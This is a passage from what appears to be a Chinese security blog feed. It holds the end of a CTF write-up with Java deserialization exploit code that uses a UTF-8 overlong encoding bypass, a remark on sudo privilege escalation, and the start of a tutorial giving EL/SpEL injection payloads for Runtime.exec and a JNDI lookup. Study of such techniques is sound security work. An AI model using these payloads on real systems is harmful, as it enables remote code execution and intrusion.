<span class="hljs-keyword">return</span> proxy;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getXstringMap</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault().get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass.removeMethod(writeReplace);<br>        ctClass.toClass();<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(obj);<br><br>        <span class="hljs-type">XString</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map1.put(<span class="hljs-string">&quot;yy&quot;</span>, node);<br>        map1.put(<span class="hljs-string">&quot;zZ&quot;</span>, xString);<br>        map2.put(<span class="hljs-string">&quot;yy&quot;</span>, xString);<br>        map2.put(<span class="hljs-string">&quot;zZ&quot;</span>, node);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> makeMap(map1, map2);<br><br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap <span class="hljs-title function_">makeMap</span><span class="hljs-params">(Object v1, Object v2)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        Class nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">nodeCons</span> <span class="hljs-operator">=</span> nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v1, v1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v2, v2, <span class="hljs-literal">null</span>));<br>        setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        Class&lt;?&gt; clazz = obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        <span class="hljs-keyword">return</span> field.get(obj);<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UTF8OverlongObjectOutputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectOutputStream</span> &#123;<br>        <span class="hljs-keyword">public</span> HashMap&lt;Character, <span class="hljs-type">int</span>[]&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;Character, <span class="hljs-type">int</span>[]&gt;() &#123;&#123;<br>            put(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xae</span>&#125;);<br>            put(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xbb</span>&#125;);<br>            put(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xa4</span>&#125;);<br>            put(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9b</span>&#125;);<br>            put(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9d</span>&#125;);<br>            put(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa1</span>&#125;);<br>            put(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa2</span>&#125;);<br>            put(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa3</span>&#125;);<br>            put(<span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa4</span>&#125;);<br>            put(<span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa5</span>&#125;);<br>            put(<span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa6</span>&#125;);<br>            put(<span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa7</span>&#125;);<br>            put(<span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa8</span>&#125;);<br>            put(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa9</span>&#125;);<br>            put(<span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaa</span>&#125;);<br>            put(<span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xab</span>&#125;);<br>            put(<span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xac</span>&#125;);<br>            put(<span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xad</span>&#125;);<br>            put(<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xae</span>&#125;);<br>            put(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaf</span>&#125;); <span class="hljs-comment">// 0x6f</span><br>            put(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb0</span>&#125;);<br>            put(<span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb1</span>&#125;);<br>            put(<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb2</span>&#125;);<br>            put(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb3</span>&#125;);<br>            put(<span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb4</span>&#125;);<br>            put(<span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb5</span>&#125;);<br>            put(<span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb6</span>&#125;);<br>            put(<span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb7</span>&#125;);<br>            put(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb8</span>&#125;);<br>            put(<span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb9</span>&#125;);<br>            put(<span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xba</span>&#125;);<br>            put(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x81</span>&#125;);<br>            put(<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x82</span>&#125;);<br>            put(<span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x83</span>&#125;);<br>            put(<span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x84</span>&#125;);<br>            put(<span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x85</span>&#125;);<br>            put(<span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x86</span>&#125;);<br>            put(<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x87</span>&#125;);<br>            put(<span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x88</span>&#125;);<br>            put(<span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x89</span>&#125;);<br>            put(<span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8a</span>&#125;);<br>            put(<span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8b</span>&#125;);<br>            put(<span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8c</span>&#125;);<br>            put(<span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8d</span>&#125;);<br>            put(<span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8e</span>&#125;);<br>            put(<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8f</span>&#125;);<br>            put(<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x90</span>&#125;);<br>            put(<span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x91</span>&#125;);<br>            put(<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x92</span>&#125;);<br>            put(<span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x93</span>&#125;);<br>            put(<span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x94</span>&#125;);<br>            put(<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x95</span>&#125;);<br>            put(<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x96</span>&#125;);<br>            put(<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x97</span>&#125;);<br>            put(<span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x98</span>&#125;);<br>            put(<span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x99</span>&#125;);<br>            put(<span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9a</span>&#125;);<br>        &#125;&#125;;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">UTF8OverlongObjectOutputStream</span><span class="hljs-params">(OutputStream out)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>            <span class="hljs-built_in">super</span>(out);<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeClassDescriptor</span><span class="hljs-params">(ObjectStreamClass desc)</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> desc.getName();<br><span class="hljs-comment">//        writeUTF(desc.getName());</span><br>                writeShort(name.length() * <span class="hljs-number">2</span>);<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; name.length(); i++) &#123;<br>                    <span class="hljs-type">char</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> name.charAt(i);<br><span class="hljs-comment">//            System.out.println(s);</span><br>                    write(map.get(s)[<span class="hljs-number">0</span>]);<br>                    write(map.get(s)[<span class="hljs-number">1</span>]);<br>                &#125;<br>                writeLong(desc.getSerialVersionUID());<br>                <span class="hljs-type">byte</span> <span class="hljs-variable">flags</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">if</span> ((Boolean) getFieldValue(desc, <span class="hljs-string">&quot;externalizable&quot;</span>)) &#123;<br>                    flags |= ObjectStreamConstants.SC_EXTERNALIZABLE;<br>                    <span class="hljs-type">Field</span> <span class="hljs-variable">protocolField</span> <span class="hljs-operator">=</span> ObjectOutputStream.class.getDeclaredField(<span class="hljs-string">&quot;protocol&quot;</span>);<br>                    protocolField.setAccessible(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-type">int</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> (Integer) protocolField.get(<span class="hljs-built_in">this</span>);<br>                    <span class="hljs-keyword">if</span> (protocol != ObjectStreamConstants.PROTOCOL_VERSION_1) &#123;<br>                        flags |= ObjectStreamConstants.SC_BLOCK_DATA;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((Boolean) getFieldValue(desc, <span class="hljs-string">&quot;serializable&quot;</span>)) &#123;<br>                    flags |= ObjectStreamConstants.SC_SERIALIZABLE;<br>                &#125;<br>                <span class="hljs-keyword">if</span> ((Boolean) getFieldValue(desc, <span class="hljs-string">&quot;hasWriteObjectData&quot;</span>)) &#123;<br>                    flags |= ObjectStreamConstants.SC_WRITE_METHOD;<br>                &#125;<br>                <span class="hljs-keyword">if</span> ((Boolean) getFieldValue(desc, <span class="hljs-string">&quot;isEnum&quot;</span>)) &#123;<br>                    flags |= ObjectStreamConstants.SC_ENUM;<br>                &#125;<br>                writeByte(flags);<br>                ObjectStreamField[] fields = (ObjectStreamField[]) getFieldValue(desc, <span class="hljs-string">&quot;fields&quot;</span>);<br>                writeShort(fields.length);<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; fields.length; i++) &#123;<br>                    <span class="hljs-type">ObjectStreamField</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> fields[i];<br>                    writeByte(f.getTypeCode());<br>                    writeUTF(f.getName());<br>                    <span class="hljs-keyword">if</span> (!f.isPrimitive()) &#123;<br>                        <span class="hljs-type">Method</span> <span class="hljs-variable">writeTypeString</span> <span class="hljs-operator">=</span> ObjectOutputStream.class.getDeclaredMethod(<span class="hljs-string">&quot;writeTypeString&quot;</span>, String.class);<br>                        writeTypeString.setAccessible(<span class="hljs-literal">true</span>);<br>                        writeTypeString.invoke(<span class="hljs-built_in">this</span>, f.getTypeString());<br><span class="hljs-comment">//                    writeTypeString(f.getTypeString());</span><br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>suid提权发现sudo可用，且设置的NOPASSWD，直接交了：</p><p><img src="/2024/08/22/Overlong-Encoding-utf-8-Bypass/image-20240822164657573.png" alt="image-20240822164657573"></p><p>fj链和内存马打法：<a href="https://blog.csdn.net/uuzeray/article/details/139222583?spm=1001.2014.3001.5501">【Web】2024 京麒CTF ezjvav题解_京麟ctf webwp-CSDN博客</a></p><p>Hessian中其实也有这个问题，详见X1师傅的文章<a href="https://exp10it.io/2024/02/hessian-utf-8-overlong-encoding/">Hessian UTF-8 Overlong Encoding - X1r0z Blog (exp10it.io)</a></p><p>参考链接见文中。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>El&amp;Spel</title>
    <link href="/2024/08/22/El-Spel/"/>
    <url>/2024/08/22/El-Spel/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>又被卷到了，来点表达式注入。</p><p>我真的受不了卷狗了。简直是狠狠push我更新的动力啊。</p><p>Java中表达式根据框架分为好多种，这里以JSP自带的表达式语言 <code>EL</code> 和使用较多的Spring框架所支持的<code>SpEL</code>为例。</p><p>其基本语法为<code>$&#123;变量表达式&#125;</code>。</p><h2 id="El-Attack"><a href="#El-Attack" class="headerlink" title="El-Attack"></a>El-Attack</h2><p>为了简化 JSP 页面，JSP 2.0 新增了 EL（Expression Language）表达式语言 <code>$&#123;EL表达式&#125;</code></p><p>Tomcat、Weblogic、Jetty等Web容器均支持EL表达式</p><p>若EL表达式没有生效，需要开启EL表达式</p><ul><li><p>法一：将 page 指令中的 <code>isELIgnored</code> 属性设置为 false</p><p><code>&lt;%@ page isELIgnored=&quot;false&quot; %&gt;</code></p></li><li><p>法二：<code>web.xml</code> 中配置 <code>&lt;el-ignored&gt;</code> 元素</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;jsp-property-group&gt;<br>    &lt;url-pattern&gt;*jsp&lt;/url-pattern&gt;<br>    &lt;el-ignored&gt;<span class="hljs-literal">false</span>&lt;/el-ignored&gt;<br>&lt;/jsp-propery-group&gt;<br></code></pre></td></tr></table></figure></li></ul><p>EL表达式中有很多内置对象</p><table><thead><tr><th align="left">内置对象</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">pageScope</td><td align="left">获取 page 范围的变量</td></tr><tr><td align="left">requestScope</td><td align="left">获取 request 范围的变量</td></tr><tr><td align="left">sessionScope</td><td align="left">获取 session 范围的变量</td></tr><tr><td align="left">applicationScope</td><td align="left">获取 application 范围的变量</td></tr><tr><td align="left">param</td><td align="left">相当于 request.getParameter(String name)，获取单个参数的值</td></tr><tr><td align="left">paramValues</td><td align="left">相当于 request.getParameterValues(String name)，获取参数集合中的变量值</td></tr><tr><td align="left">header</td><td align="left">相当于 request.getHeader(String name)，获取 HTTP 请求头信息</td></tr><tr><td align="left">headerValues</td><td align="left">相当于 request.getHeaders(String name)，获取 HTTP 请求头数组信息</td></tr><tr><td align="left">initParam</td><td align="left">相当于 application.getInitParameter(String name)，获取 web.xml 文件中的参数值</td></tr><tr><td align="left">cookie</td><td align="left">相当于 request.getCookies()，获取 cookie 中的值</td></tr><tr><td align="left">pageContext</td><td align="left">表示当前 JSP 页面的 pageContext 对象</td></tr></tbody></table><p>EL表达式不仅可以以文本元素的形式出现，也可以出现在Jsp标签中</p><h3 id="Jsp-vs-El"><a href="#Jsp-vs-El" class="headerlink" title="Jsp vs El"></a>Jsp vs El</h3><p>相比Jsp，EL表达式的执行会更加灵活</p><ul><li>work✔️</li></ul><blockquote><p>&lt;%</p><p>((ScriptEngineManager)””.getClass().<em>forName</em>(“javax.script.ScriptEngineManager”).newInstance()).getEngineByName(“js”).eval(“java.lang.Runtime.getRuntime().exec(‘calc’)”);</p><p>%&gt;</p></blockquote><ul><li>fail✖️</li></ul><blockquote><p>&lt;% “”.getClass().<em>forName</em>(“javax.script.ScriptEngineManager”).newInstance().getEngineByName(“js”).eval(“java.lang.Runtime.getRuntime().exec(‘calc’)”);</p><p>%&gt;</p><p>The method getEngineByName(String) is undefined for the type</p></blockquote><ul><li>work✔️</li></ul><blockquote><p>${“”.getClass().forName(“javax.script.ScriptEngineManager”).newInstance().getEngineByName(“js”).eval(“java.lang.Runtime.getRuntime().exec(‘calc’)”)}</p></blockquote><p>可见EL表达式能够自动进行类型转换，Tomcat内置的JSP引擎——Apache Jasper如何执行EL表达式就不跟了。</p><p>直接给出结论：</p><p>这种调用方式让方法以字符串的形式出现，可以把用调用的参数通过外部参数传入，实现更隐蔽的EL执行</p><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">$&#123;<span class="hljs-string">&quot;&quot;</span>[param.a]()[param.b](param.c)[param.d]()[param.e](param.f)[param.g](param.h)&#125;<br></code></pre></td></tr></table></figure></blockquote><blockquote><p>a&#x3D;getClass&amp;b&#x3D;forName&amp;c&#x3D;javax.script.ScriptEngineManager&amp;d&#x3D;newInstance&amp;e&#x3D;getEngineByName&amp;f&#x3D;js&amp;g&#x3D;eval&amp;h&#x3D;java.lang.Runtime.getRuntime().exec(‘calc’)</p></blockquote><h3 id="Getter-Setter"><a href="#Getter-Setter" class="headerlink" title="Getter &amp; Setter"></a>Getter &amp; Setter</h3><p>EL表达式不支持<code>Object a = xxx</code>来存储临时局部变量。可以利用内置对象来存储。</p><p>并且点号属性取值相当于执行对象的getter方法，等号属性赋值则等同于执行setter方法</p><blockquote><p>${pageContext.setAttribute(“obj”, “”.getClass().forName(“com.sun.rowset.JdbcRowSetImpl”).newInstance());</p><p>pageContext.getAttribute(“obj”).dataSourceName&#x3D;”ldap:&#x2F;&#x2F;127.0.0.1:8099&#x2F;a”;</p><p>pageContext.getAttribute(“obj”).autoCommit&#x3D;true}</p></blockquote><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.apache.el.parser.AstAssign#getValue<br></code></pre></td></tr></table></figure><p>-&gt; <code>org.apache.el.parser.AstValue#getValue</code></p><p> -&gt; <code>org.apache.el.parser.AstValue#setValue</code></p><p> -&gt; <code>javax.el.CompositeELResolver#setValue</code></p><p> -&gt; <code>javax.el.BeanELResolver#setValue</code></p></blockquote><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//对应于JSP页面中的pageContext对象</span><br>$&#123;pageContext&#125;<br><span class="hljs-comment">//获取Web路径</span><br>$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(<span class="hljs-string">&quot;&quot;</span>)&#125;<br><span class="hljs-comment">//文件头参数</span><br>$&#123;header&#125;<br><span 